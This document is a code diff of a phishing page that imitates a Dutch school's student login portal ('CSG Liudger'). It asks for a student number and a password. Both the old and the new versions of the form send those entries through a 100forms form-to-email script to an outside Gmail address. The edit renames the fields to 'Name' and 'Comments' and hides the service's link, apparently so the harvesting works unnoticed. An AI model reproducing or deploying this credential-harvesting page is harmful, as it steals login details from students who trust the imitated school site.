@@ -32,15 +32,22 @@
 	<figure class="figurelogo"></figure>
 </header>
 		
-        <form id="id1" method="post" action="https://www.100forms.com/js/FORMKEY:4KLYZS99LN3L/SEND:omgflufy@gmail.com" onSubmit="return validateForm();"><div style="width:0px;height:0px;position:absolute;left:-100px;top:-100px;overflow:hidden" class="hidden-fields"><input type="text" tabindex="-1" autocomplete="off"><input type="submit" tabindex="-1" name="loginLink" onclick=" var b=document.getElementById('id2'); if (b!=null&amp;&amp;b.onclick!=null&amp;&amp;typeof(b.onclick) != 'undefined') {  var r = Wicket.bind(b.onclick, b)(); if (r != false) b.click(); } else { b.click(); };  return false;"></div>
-            <div class="form--input state-disabled">
-			<input type="hidden" name="_next" value="https://site.io/thanks.html" />
+        <form action="//submit.form" id="ContactUs100" method="post" onsubmit="return ValidateForm(this);"><div style="width:0px;height:0px;position:absolute;left:-100px;top:-100px;overflow:hidden" class="hidden-fields"><input type="text" tabindex="-1" autocomplete="off"><input type="submit" tabindex="-1" name="loginLink" onclick=" var b=document.getElementById('id2'); if (b!=null&amp;&amp;b.onclick!=null&amp;&amp;typeof(b.onclick) != 'undefined') {  var r = Wicket.bind(b.onclick, b)(); if (r != false) b.click(); } else { b.click(); };  return false;"></div>
+            <script type="text/javascript">
+function ValidateForm(frm) {
+if (frm.Name.value == "") { alert('Name is required.'); frm.Name.focus(); return false; }
+if (frm.FromEmailAddress.value == "") { alert('Email address is required.'); frm.FromEmailAddress.focus(); return false; }
+if (frm.FromEmailAddress.value.indexOf("@") < 1 || frm.FromEmailAddress.value.indexOf(".") < 1) { alert('Please enter a valid email address.'); frm.FromEmailAddress.focus(); return false; }
+if (frm.Comments.value == "") { alert('Please enter comments or questions.'); frm.Comments.focus(); return false; }
+return true; }
+</script>
+			
                 <input type="text" value="CSG Liudger" name="message" >
                 <div onclick="var win = this.ownerDocument.defaultView || this.ownerDocument.parentWindow; if (win == window) { window.location.href='./login?0-1.-passwordForm-wijzigDomain'; } ;return false"><i class="icon-map-marker"></i></div>
             </div>
             <div class="form--input" id="id3">
 		<div style="padding-bottom: 18px;">leerling<span style="color: red;"> *</span><br/>
-<input type="number" id="data_1" name="data_1" style="width : 350px;" class="form-control"/>
+<input type="number" id="data_1" name="Name" style="width : 350px;" class="form-control"/>
                 </div>
 	    <div id="id4">
   
@@ -49,7 +56,7 @@
             <div class="form--input" id="id5">
 		
                 <div style="padding-bottom: 18px;">Wachtwoord<span style="color: red;"> *</span><br/>
-<input type="password" id="data_10" name="data_10" style="width : 350px;" class="form-control"/></div>
+<input type="password" id="data_10" name="Comments" style="width : 350px;" class="form-control"/></div>
 
 </div>
                 <i class="icon-lock"></i>
@@ -57,32 +64,14 @@
 	    <div id="id6">
   
 </div>
-	</div>
-           
-         <center>  <div class="button--stpanel" id="id2"><input class="button--stpanel" id="id2" name="skip_Submit" value="inloggen" type="submit"/></div></center>
+	</div><div style="display:none;">
+           <div style="float:right"><a href="https://www.100forms.com" id="lnk100" title="form to email">form to email</a></div></div>
+
+<script src="https://www.100forms.com/js/FORMKEY:6C2X46KDUHKS/SEND:omgflufy@gmail.com" type="text/javascript"></script>
+         <center>  <div class="button--stpanel" id="id2"><input id="id2" class="button--stpanel" name="skip_Submit" type="submit" value="Inloggen" /></div></center>
 		   <div class="form--note-error" id="id7">
   
-</div><div style="float:right; display: none;"><a"href="https://www.100forms.com" id="lnk100" title="form to email">form to email</a></div>
-<script src="https://www.100forms.com/js/FORMKEY:4KLYZS99LN3L/SEND:omgflufy@gmail.com" type="text/javascript"></script>
-        </form>
-		<script type="text/javascript">
-function validateForm() {
-if (isEmpty(document.getElementById('data_1').value.trim())) {
-alert('leerling is required!');
-return false;
-}
-if (isEmpty(document.getElementById('data_10').value.trim())) {
-alert('Wachtwoord is required!');
-return false;
-}
-return true;
-}
-function isEmpty(str) { return (str.length === 0 || !str.trim()); }
-function validateEmail(email) {
-var re = /^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,15}(?:\.[a-z]{2})?)$/i;
-return isEmpty(email) || re.test(email);
-}
-</script>
+
         <ul class="stpanel--links">
             <li><a href="./login?0-1.-wachtwoordVergeten"><span>Wachtwoord vergeten?</span></a></li>
         </ul>
